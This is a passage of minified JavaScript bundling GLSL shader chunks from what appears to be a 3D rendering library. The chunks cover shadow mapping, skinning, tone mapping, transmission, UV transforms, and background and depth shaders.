	vec3 shadowWorldNormal = inverseTransformDirection( transformedNormal, viewMatrix );
	vec4 shadowWorldPosition;
#endif
#if defined( USE_SHADOWMAP )
	#if NUM_DIR_LIGHT_SHADOWS > 0
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {
			shadowWorldPosition = worldPosition + vec4( shadowWorldNormal * directionalLightShadows[ i ].shadowNormalBias, 0 );
			vDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * shadowWorldPosition;
		}
		#pragma unroll_loop_end
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {
			shadowWorldPosition = worldPosition + vec4( shadowWorldNormal * pointLightShadows[ i ].shadowNormalBias, 0 );
			vPointShadowCoord[ i ] = pointShadowMatrix[ i ] * shadowWorldPosition;
		}
		#pragma unroll_loop_end
	#endif
#endif
#if NUM_SPOT_LIGHT_COORDS > 0
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHT_COORDS; i ++ ) {
		shadowWorldPosition = worldPosition;
		#if ( defined( USE_SHADOWMAP ) && UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
			shadowWorldPosition.xyz += shadowWorldNormal * spotLightShadows[ i ].shadowNormalBias;
		#endif
		vSpotLightCoord[ i ] = spotLightMatrix[ i ] * shadowWorldPosition;
	}
	#pragma unroll_loop_end
#endif`,Jd=`float getShadowMask() {
	float shadow = 1.0;
	#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
	DirectionalLightShadow directionalLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {
		directionalLight = directionalLightShadows[ i ];
		shadow *= receiveShadow ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
	SpotLightShadow spotLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {
		spotLight = spotLightShadows[ i ];
		shadow *= receiveShadow ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotLightCoord[ i ] ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
	PointLightShadow pointLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {
		pointLight = pointLightShadows[ i ];
		shadow *= receiveShadow ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#endif
	return shadow;
}`,Qd=`#ifdef USE_SKINNING
	mat4 boneMatX = getBoneMatrix( skinIndex.x );
	mat4 boneMatY = getBoneMatrix( skinIndex.y );
	mat4 boneMatZ = getBoneMatrix( skinIndex.z );
	mat4 boneMatW = getBoneMatrix( skinIndex.w );
#endif`,tu=`#ifdef USE_SKINNING
	uniform mat4 bindMatrix;
	uniform mat4 bindMatrixInverse;
	uniform highp sampler2D boneTexture;
	mat4 getBoneMatrix( const in float i ) {
		int size = textureSize( boneTexture, 0 ).x;
		int j = int( i ) * 4;
		int x = j % size;
		int y = j / size;
		vec4 v1 = texelFetch( boneTexture, ivec2( x, y ), 0 );
		vec4 v2 = texelFetch( boneTexture, ivec2( x + 1, y ), 0 );
		vec4 v3 = texelFetch( boneTexture, ivec2( x + 2, y ), 0 );
		vec4 v4 = texelFetch( boneTexture, ivec2( x + 3, y ), 0 );
		return mat4( v1, v2, v3, v4 );
	}
#endif`,eu=`#ifdef USE_SKINNING
	vec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );
	vec4 skinned = vec4( 0.0 );
	skinned += boneMatX * skinVertex * skinWeight.x;
	skinned += boneMatY * skinVertex * skinWeight.y;
	skinned += boneMatZ * skinVertex * skinWeight.z;
	skinned += boneMatW * skinVertex * skinWeight.w;
	transformed = ( bindMatrixInverse * skinned ).xyz;
#endif`,nu=`#ifdef USE_SKINNING
	mat4 skinMatrix = mat4( 0.0 );
	skinMatrix += skinWeight.x * boneMatX;
	skinMatrix += skinWeight.y * boneMatY;
	skinMatrix += skinWeight.z * boneMatZ;
	skinMatrix += skinWeight.w * boneMatW;
	skinMatrix = bindMatrixInverse * skinMatrix * bindMatrix;
	objectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;
	#ifdef USE_TANGENT
		objectTangent = vec4( skinMatrix * vec4( objectTangent, 0.0 ) ).xyz;
	#endif
#endif`,iu=`float specularStrength;
#ifdef USE_SPECULARMAP
	vec4 texelSpecular = texture2D( specularMap, vSpecularMapUv );
	specularStrength = texelSpecular.r;
#else
	specularStrength = 1.0;
#endif`,ru=`#ifdef USE_SPECULARMAP
	uniform sampler2D specularMap;
#endif`,su=`#if defined( TONE_MAPPING )
	gl_FragColor.rgb = toneMapping( gl_FragColor.rgb );
#endif`,au=`#ifndef saturate
#define saturate( a ) clamp( a, 0.0, 1.0 )
#endif
uniform float toneMappingExposure;
vec3 LinearToneMapping( vec3 color ) {
	return saturate( toneMappingExposure * color );
}
vec3 ReinhardToneMapping( vec3 color ) {
	color *= toneMappingExposure;
	return saturate( color / ( vec3( 1.0 ) + color ) );
}
vec3 OptimizedCineonToneMapping( vec3 color ) {
	color *= toneMappingExposure;
	color = max( vec3( 0.0 ), color - 0.004 );
	return pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );
}
vec3 RRTAndODTFit( vec3 v ) {
	vec3 a = v * ( v + 0.0245786 ) - 0.000090537;
	vec3 b = v * ( 0.983729 * v + 0.4329510 ) + 0.238081;
	return a / b;
}
vec3 ACESFilmicToneMapping( vec3 color ) {
	const mat3 ACESInputMat = mat3(
		vec3( 0.59719, 0.07600, 0.02840 ),		vec3( 0.35458, 0.90834, 0.13383 ),
		vec3( 0.04823, 0.01566, 0.83777 )
	);
	const mat3 ACESOutputMat = mat3(
		vec3(  1.60475, -0.10208, -0.00327 ),		vec3( -0.53108,  1.10813, -0.07276 ),
		vec3( -0.07367, -0.00605,  1.07602 )
	);
	color *= toneMappingExposure / 0.6;
	color = ACESInputMat * color;
	color = RRTAndODTFit( color );
	color = ACESOutputMat * color;
	return saturate( color );
}
const mat3 LINEAR_REC2020_TO_LINEAR_SRGB = mat3(
	vec3( 1.6605, - 0.1246, - 0.0182 ),
	vec3( - 0.5876, 1.1329, - 0.1006 ),
	vec3( - 0.0728, - 0.0083, 1.1187 )
);
const mat3 LINEAR_SRGB_TO_LINEAR_REC2020 = mat3(
	vec3( 0.6274, 0.0691, 0.0164 ),
	vec3( 0.3293, 0.9195, 0.0880 ),
	vec3( 0.0433, 0.0113, 0.8956 )
);
vec3 agxDefaultContrastApprox( vec3 x ) {
	vec3 x2 = x * x;
	vec3 x4 = x2 * x2;
	return + 15.5 * x4 * x2
		- 40.14 * x4 * x
		+ 31.96 * x4
		- 6.868 * x2 * x
		+ 0.4298 * x2
		+ 0.1191 * x
		- 0.00232;
}
vec3 AgXToneMapping( vec3 color ) {
	const mat3 AgXInsetMatrix = mat3(
		vec3( 0.856627153315983, 0.137318972929847, 0.11189821299995 ),
		vec3( 0.0951212405381588, 0.761241990602591, 0.0767994186031903 ),
		vec3( 0.0482516061458583, 0.101439036467562, 0.811302368396859 )
	);
	const mat3 AgXOutsetMatrix = mat3(
		vec3( 1.1271005818144368, - 0.1413297634984383, - 0.14132976349843826 ),
		vec3( - 0.11060664309660323, 1.157823702216272, - 0.11060664309660294 ),
		vec3( - 0.016493938717834573, - 0.016493938717834257, 1.2519364065950405 )
	);
	const float AgxMinEv = - 12.47393;	const float AgxMaxEv = 4.026069;
	color = LINEAR_SRGB_TO_LINEAR_REC2020 * color;
	color *= toneMappingExposure;
	color = AgXInsetMatrix * color;
	color = max( color, 1e-10 );	color = log2( color );
	color = ( color - AgxMinEv ) / ( AgxMaxEv - AgxMinEv );
	color = clamp( color, 0.0, 1.0 );
	color = agxDefaultContrastApprox( color );
	color = AgXOutsetMatrix * color;
	color = pow( max( vec3( 0.0 ), color ), vec3( 2.2 ) );
	color = LINEAR_REC2020_TO_LINEAR_SRGB * color;
	return color;
}
vec3 CustomToneMapping( vec3 color ) { return color; }`,ou=`#ifdef USE_TRANSMISSION
	material.transmission = transmission;
	material.transmissionAlpha = 1.0;
	material.thickness = thickness;
	material.attenuationDistance = attenuationDistance;
	material.attenuationColor = attenuationColor;
	#ifdef USE_TRANSMISSIONMAP
		material.transmission *= texture2D( transmissionMap, vTransmissionMapUv ).r;
	#endif
	#ifdef USE_THICKNESSMAP
		material.thickness *= texture2D( thicknessMap, vThicknessMapUv ).g;
	#endif
	vec3 pos = vWorldPosition;
	vec3 v = normalize( cameraPosition - pos );
	vec3 n = inverseTransformDirection( normal, viewMatrix );
	vec4 transmitted = getIBLVolumeRefraction(
		n, v, material.roughness, material.diffuseColor, material.specularColor, material.specularF90,
		pos, modelMatrix, viewMatrix, projectionMatrix, material.ior, material.thickness,
		material.attenuationColor, material.attenuationDistance );
	material.transmissionAlpha = mix( material.transmissionAlpha, transmitted.a, material.transmission );
	totalDiffuse = mix( totalDiffuse, transmitted.rgb, material.transmission );
#endif`,lu=`#ifdef USE_TRANSMISSION
	uniform float transmission;
	uniform float thickness;
	uniform float attenuationDistance;
	uniform vec3 attenuationColor;
	#ifdef USE_TRANSMISSIONMAP
		uniform sampler2D transmissionMap;
	#endif
	#ifdef USE_THICKNESSMAP
		uniform sampler2D thicknessMap;
	#endif
	uniform vec2 transmissionSamplerSize;
	uniform sampler2D transmissionSamplerMap;
	uniform mat4 modelMatrix;
	uniform mat4 projectionMatrix;
	varying vec3 vWorldPosition;
	float w0( float a ) {
		return ( 1.0 / 6.0 ) * ( a * ( a * ( - a + 3.0 ) - 3.0 ) + 1.0 );
	}
	float w1( float a ) {
		return ( 1.0 / 6.0 ) * ( a *  a * ( 3.0 * a - 6.0 ) + 4.0 );
	}
	float w2( float a ){
		return ( 1.0 / 6.0 ) * ( a * ( a * ( - 3.0 * a + 3.0 ) + 3.0 ) + 1.0 );
	}
	float w3( float a ) {
		return ( 1.0 / 6.0 ) * ( a * a * a );
	}
	float g0( float a ) {
		return w0( a ) + w1( a );
	}
	float g1( float a ) {
		return w2( a ) + w3( a );
	}
	float h0( float a ) {
		return - 1.0 + w1( a ) / ( w0( a ) + w1( a ) );
	}
	float h1( float a ) {
		return 1.0 + w3( a ) / ( w2( a ) + w3( a ) );
	}
	vec4 bicubic( sampler2D tex, vec2 uv, vec4 texelSize, float lod ) {
		uv = uv * texelSize.zw + 0.5;
		vec2 iuv = floor( uv );
		vec2 fuv = fract( uv );
		float g0x = g0( fuv.x );
		float g1x = g1( fuv.x );
		float h0x = h0( fuv.x );
		float h1x = h1( fuv.x );
		float h0y = h0( fuv.y );
		float h1y = h1( fuv.y );
		vec2 p0 = ( vec2( iuv.x + h0x, iuv.y + h0y ) - 0.5 ) * texelSize.xy;
		vec2 p1 = ( vec2( iuv.x + h1x, iuv.y + h0y ) - 0.5 ) * texelSize.xy;
		vec2 p2 = ( vec2( iuv.x + h0x, iuv.y + h1y ) - 0.5 ) * texelSize.xy;
		vec2 p3 = ( vec2( iuv.x + h1x, iuv.y + h1y ) - 0.5 ) * texelSize.xy;
		return g0( fuv.y ) * ( g0x * textureLod( tex, p0, lod ) + g1x * textureLod( tex, p1, lod ) ) +
			g1( fuv.y ) * ( g0x * textureLod( tex, p2, lod ) + g1x * textureLod( tex, p3, lod ) );
	}
	vec4 textureBicubic( sampler2D sampler, vec2 uv, float lod ) {
		vec2 fLodSize = vec2( textureSize( sampler, int( lod ) ) );
		vec2 cLodSize = vec2( textureSize( sampler, int( lod + 1.0 ) ) );
		vec2 fLodSizeInv = 1.0 / fLodSize;
		vec2 cLodSizeInv = 1.0 / cLodSize;
		vec4 fSample = bicubic( sampler, uv, vec4( fLodSizeInv, fLodSize ), floor( lod ) );
		vec4 cSample = bicubic( sampler, uv, vec4( cLodSizeInv, cLodSize ), ceil( lod ) );
		return mix( fSample, cSample, fract( lod ) );
	}
	vec3 getVolumeTransmissionRay( const in vec3 n, const in vec3 v, const in float thickness, const in float ior, const in mat4 modelMatrix ) {
		vec3 refractionVector = refract( - v, normalize( n ), 1.0 / ior );
		vec3 modelScale;
		modelScale.x = length( vec3( modelMatrix[ 0 ].xyz ) );
		modelScale.y = length( vec3( modelMatrix[ 1 ].xyz ) );
		modelScale.z = length( vec3( modelMatrix[ 2 ].xyz ) );
		return normalize( refractionVector ) * thickness * modelScale;
	}
	float applyIorToRoughness( const in float roughness, const in float ior ) {
		return roughness * clamp( ior * 2.0 - 2.0, 0.0, 1.0 );
	}
	vec4 getTransmissionSample( const in vec2 fragCoord, const in float roughness, const in float ior ) {
		float lod = log2( transmissionSamplerSize.x ) * applyIorToRoughness( roughness, ior );
		return textureBicubic( transmissionSamplerMap, fragCoord.xy, lod );
	}
	vec3 volumeAttenuation( const in float transmissionDistance, const in vec3 attenuationColor, const in float attenuationDistance ) {
		if ( isinf( attenuationDistance ) ) {
			return vec3( 1.0 );
		} else {
			vec3 attenuationCoefficient = -log( attenuationColor ) / attenuationDistance;
			vec3 transmittance = exp( - attenuationCoefficient * transmissionDistance );			return transmittance;
		}
	}
	vec4 getIBLVolumeRefraction( const in vec3 n, const in vec3 v, const in float roughness, const in vec3 diffuseColor,
		const in vec3 specularColor, const in float specularF90, const in vec3 position, const in mat4 modelMatrix,
		const in mat4 viewMatrix, const in mat4 projMatrix, const in float ior, const in float thickness,
		const in vec3 attenuationColor, const in float attenuationDistance ) {
		vec3 transmissionRay = getVolumeTransmissionRay( n, v, thickness, ior, modelMatrix );
		vec3 refractedRayExit = position + transmissionRay;
		vec4 ndcPos = projMatrix * viewMatrix * vec4( refractedRayExit, 1.0 );
		vec2 refractionCoords = ndcPos.xy / ndcPos.w;
		refractionCoords += 1.0;
		refractionCoords /= 2.0;
		vec4 transmittedLight = getTransmissionSample( refractionCoords, roughness, ior );
		vec3 transmittance = diffuseColor * volumeAttenuation( length( transmissionRay ), attenuationColor, attenuationDistance );
		vec3 attenuatedColor = transmittance * transmittedLight.rgb;
		vec3 F = EnvironmentBRDF( n, v, specularColor, specularF90, roughness );
		float transmittanceFactor = ( transmittance.r + transmittance.g + transmittance.b ) / 3.0;
		return vec4( ( 1.0 - F ) * attenuatedColor, 1.0 - ( 1.0 - transmittedLight.a ) * transmittanceFactor );
	}
#endif`,cu=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	varying vec2 vUv;
#endif
#ifdef USE_MAP
	varying vec2 vMapUv;
#endif
#ifdef USE_ALPHAMAP
	varying vec2 vAlphaMapUv;
#endif
#ifdef USE_LIGHTMAP
	varying vec2 vLightMapUv;
#endif
#ifdef USE_AOMAP
	varying vec2 vAoMapUv;
#endif
#ifdef USE_BUMPMAP
	varying vec2 vBumpMapUv;
#endif
#ifdef USE_NORMALMAP
	varying vec2 vNormalMapUv;
#endif
#ifdef USE_EMISSIVEMAP
	varying vec2 vEmissiveMapUv;
#endif
#ifdef USE_METALNESSMAP
	varying vec2 vMetalnessMapUv;
#endif
#ifdef USE_ROUGHNESSMAP
	varying vec2 vRoughnessMapUv;
#endif
#ifdef USE_ANISOTROPYMAP
	varying vec2 vAnisotropyMapUv;
#endif
#ifdef USE_CLEARCOATMAP
	varying vec2 vClearcoatMapUv;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	varying vec2 vClearcoatNormalMapUv;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	varying vec2 vClearcoatRoughnessMapUv;
#endif
#ifdef USE_IRIDESCENCEMAP
	varying vec2 vIridescenceMapUv;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	varying vec2 vIridescenceThicknessMapUv;
#endif
#ifdef USE_SHEEN_COLORMAP
	varying vec2 vSheenColorMapUv;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	varying vec2 vSheenRoughnessMapUv;
#endif
#ifdef USE_SPECULARMAP
	varying vec2 vSpecularMapUv;
#endif
#ifdef USE_SPECULAR_COLORMAP
	varying vec2 vSpecularColorMapUv;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	varying vec2 vSpecularIntensityMapUv;
#endif
#ifdef USE_TRANSMISSIONMAP
	uniform mat3 transmissionMapTransform;
	varying vec2 vTransmissionMapUv;
#endif
#ifdef USE_THICKNESSMAP
	uniform mat3 thicknessMapTransform;
	varying vec2 vThicknessMapUv;
#endif`,du=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	varying vec2 vUv;
#endif
#ifdef USE_MAP
	uniform mat3 mapTransform;
	varying vec2 vMapUv;
#endif
#ifdef USE_ALPHAMAP
	uniform mat3 alphaMapTransform;
	varying vec2 vAlphaMapUv;
#endif
#ifdef USE_LIGHTMAP
	uniform mat3 lightMapTransform;
	varying vec2 vLightMapUv;
#endif
#ifdef USE_AOMAP
	uniform mat3 aoMapTransform;
	varying vec2 vAoMapUv;
#endif
#ifdef USE_BUMPMAP
	uniform mat3 bumpMapTransform;
	varying vec2 vBumpMapUv;
#endif
#ifdef USE_NORMALMAP
	uniform mat3 normalMapTransform;
	varying vec2 vNormalMapUv;
#endif
#ifdef USE_DISPLACEMENTMAP
	uniform mat3 displacementMapTransform;
	varying vec2 vDisplacementMapUv;
#endif
#ifdef USE_EMISSIVEMAP
	uniform mat3 emissiveMapTransform;
	varying vec2 vEmissiveMapUv;
#endif
#ifdef USE_METALNESSMAP
	uniform mat3 metalnessMapTransform;
	varying vec2 vMetalnessMapUv;
#endif
#ifdef USE_ROUGHNESSMAP
	uniform mat3 roughnessMapTransform;
	varying vec2 vRoughnessMapUv;
#endif
#ifdef USE_ANISOTROPYMAP
	uniform mat3 anisotropyMapTransform;
	varying vec2 vAnisotropyMapUv;
#endif
#ifdef USE_CLEARCOATMAP
	uniform mat3 clearcoatMapTransform;
	varying vec2 vClearcoatMapUv;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	uniform mat3 clearcoatNormalMapTransform;
	varying vec2 vClearcoatNormalMapUv;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	uniform mat3 clearcoatRoughnessMapTransform;
	varying vec2 vClearcoatRoughnessMapUv;
#endif
#ifdef USE_SHEEN_COLORMAP
	uniform mat3 sheenColorMapTransform;
	varying vec2 vSheenColorMapUv;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	uniform mat3 sheenRoughnessMapTransform;
	varying vec2 vSheenRoughnessMapUv;
#endif
#ifdef USE_IRIDESCENCEMAP
	uniform mat3 iridescenceMapTransform;
	varying vec2 vIridescenceMapUv;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	uniform mat3 iridescenceThicknessMapTransform;
	varying vec2 vIridescenceThicknessMapUv;
#endif
#ifdef USE_SPECULARMAP
	uniform mat3 specularMapTransform;
	varying vec2 vSpecularMapUv;
#endif
#ifdef USE_SPECULAR_COLORMAP
	uniform mat3 specularColorMapTransform;
	varying vec2 vSpecularColorMapUv;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	uniform mat3 specularIntensityMapTransform;
	varying vec2 vSpecularIntensityMapUv;
#endif
#ifdef USE_TRANSMISSIONMAP
	uniform mat3 transmissionMapTransform;
	varying vec2 vTransmissionMapUv;
#endif
#ifdef USE_THICKNESSMAP
	uniform mat3 thicknessMapTransform;
	varying vec2 vThicknessMapUv;
#endif`,uu=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	vUv = vec3( uv, 1 ).xy;
#endif
#ifdef USE_MAP
	vMapUv = ( mapTransform * vec3( MAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ALPHAMAP
	vAlphaMapUv = ( alphaMapTransform * vec3( ALPHAMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_LIGHTMAP
	vLightMapUv = ( lightMapTransform * vec3( LIGHTMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_AOMAP
	vAoMapUv = ( aoMapTransform * vec3( AOMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_BUMPMAP
	vBumpMapUv = ( bumpMapTransform * vec3( BUMPMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_NORMALMAP
	vNormalMapUv = ( normalMapTransform * vec3( NORMALMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_DISPLACEMENTMAP
	vDisplacementMapUv = ( displacementMapTransform * vec3( DISPLACEMENTMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_EMISSIVEMAP
	vEmissiveMapUv = ( emissiveMapTransform * vec3( EMISSIVEMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_METALNESSMAP
	vMetalnessMapUv = ( metalnessMapTransform * vec3( METALNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ROUGHNESSMAP
	vRoughnessMapUv = ( roughnessMapTransform * vec3( ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ANISOTROPYMAP
	vAnisotropyMapUv = ( anisotropyMapTransform * vec3( ANISOTROPYMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOATMAP
	vClearcoatMapUv = ( clearcoatMapTransform * vec3( CLEARCOATMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	vClearcoatNormalMapUv = ( clearcoatNormalMapTransform * vec3( CLEARCOAT_NORMALMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	vClearcoatRoughnessMapUv = ( clearcoatRoughnessMapTransform * vec3( CLEARCOAT_ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_IRIDESCENCEMAP
	vIridescenceMapUv = ( iridescenceMapTransform * vec3( IRIDESCENCEMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	vIridescenceThicknessMapUv = ( iridescenceThicknessMapTransform * vec3( IRIDESCENCE_THICKNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SHEEN_COLORMAP
	vSheenColorMapUv = ( sheenColorMapTransform * vec3( SHEEN_COLORMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	vSheenRoughnessMapUv = ( sheenRoughnessMapTransform * vec3( SHEEN_ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULARMAP
	vSpecularMapUv = ( specularMapTransform * vec3( SPECULARMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULAR_COLORMAP
	vSpecularColorMapUv = ( specularColorMapTransform * vec3( SPECULAR_COLORMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	vSpecularIntensityMapUv = ( specularIntensityMapTransform * vec3( SPECULAR_INTENSITYMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_TRANSMISSIONMAP
	vTransmissionMapUv = ( transmissionMapTransform * vec3( TRANSMISSIONMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_THICKNESSMAP
	vThicknessMapUv = ( thicknessMapTransform * vec3( THICKNESSMAP_UV, 1 ) ).xy;
#endif`,pu=`#if defined( USE_ENVMAP ) || defined( DISTANCE ) || defined ( USE_SHADOWMAP ) || defined ( USE_TRANSMISSION ) || NUM_SPOT_LIGHT_COORDS > 0
	vec4 worldPosition = vec4( transformed, 1.0 );
	#ifdef USE_BATCHING
		worldPosition = batchingMatrix * worldPosition;
	#endif
	#ifdef USE_INSTANCING
		worldPosition = instanceMatrix * worldPosition;
	#endif
	worldPosition = modelMatrix * worldPosition;
#endif`;const fu=`varying vec2 vUv;
uniform mat3 uvTransform;
void main() {
	vUv = ( uvTransform * vec3( uv, 1 ) ).xy;
	gl_Position = vec4( position.xy, 1.0, 1.0 );
}`,hu=`uniform sampler2D t2D;
uniform float backgroundIntensity;
varying vec2 vUv;
void main() {
	vec4 texColor = texture2D( t2D, vUv );
	#ifdef DECODE_VIDEO_TEXTURE
		texColor = vec4( mix( pow( texColor.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), texColor.rgb * 0.0773993808, vec3( lessThanEqual( texColor.rgb, vec3( 0.04045 ) ) ) ), texColor.w );
	#endif
	texColor.rgb *= backgroundIntensity;
	gl_FragColor = texColor;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,mu=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
	gl_Position.z = gl_Position.w;
}`,_u=`#ifdef ENVMAP_TYPE_CUBE
	uniform samplerCube envMap;
#elif defined( ENVMAP_TYPE_CUBE_UV )
	uniform sampler2D envMap;
#endif
uniform float flipEnvMap;
uniform float backgroundBlurriness;
uniform float backgroundIntensity;
varying vec3 vWorldDirection;
#include <cube_uv_reflection_fragment>
void main() {
	#ifdef ENVMAP_TYPE_CUBE
		vec4 texColor = textureCube( envMap, vec3( flipEnvMap * vWorldDirection.x, vWorldDirection.yz ) );
	#elif defined( ENVMAP_TYPE_CUBE_UV )
		vec4 texColor = textureCubeUV( envMap, vWorldDirection, backgroundBlurriness );
	#else
		vec4 texColor = vec4( 0.0, 0.0, 0.0, 1.0 );
	#endif
	texColor.rgb *= backgroundIntensity;
	gl_FragColor = texColor;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,gu=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
	gl_Position.z = gl_Position.w;
}`,vu=`uniform samplerCube tCube;
uniform float tFlip;
uniform float opacity;
varying vec3 vWorldDirection;
void main() {
	vec4 texColor = textureCube( tCube, vec3( tFlip * vWorldDirection.x, vWorldDirection.yz ) );
	gl_FragColor = texColor;
	gl_FragColor.a *= opacity;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,xu=`#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
varying vec2 vHighPrecisionZW;
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <skinbase_vertex>
	#ifdef USE_DISPLACEMENTMAP
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vHighPrecisionZW = gl_Position.zw;
}`,Eu=`#if DEPTH_PACKING == 3200
	uniform float opacity;
#endif
#include <common>
#include <packing>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
varying vec2 vHighPrecisionZW;
void main() {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( 1.0 );
	#if DEPTH_PACKING == 3200
		diffuseColor.a = opacity;
	#endif
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <logdepthbuf_fragment>
	float fragCoordZ = 0.5 * vHighPrecisionZW[0] / vHighPrecisionZW[1] + 0.5;
	#if DEPTH_PACKING == 3200
		gl_FragColor = vec4( vec3( 1.0 - fragCoordZ ), opacity );
	#elif DEPTH_PACKING == 3201
		gl_FragColor = packDepthToRGBA( fragCoordZ );
	#endif
}`,yu=`#define DISTANCE
varying vec3 vWorldPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <skinbase_vertex>
	#ifdef USE_DISPLACEMENTMAP
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <worldpos_vertex>
	#include <clipping_planes_vertex>
	vWorldPosition = worldPosition.xyz;
}`,Mu=`#define DISTANCE
uniform vec3 referencePosition;
uniform float nearDistance;
uniform float farDistance;
varying vec3 vWorldPosition;
#include <common>
#include <packing>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <clipping_planes_pars_fragment>
void main () {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( 1.0 );
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	float dist = length( vWorldPosition - referencePosition );
	dist = ( dist - nearDistance ) / ( farDistance - nearDistance );
	dist = saturate( dist );
	gl_FragColor = packDepthToRGBA( dist );
}`,Su=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
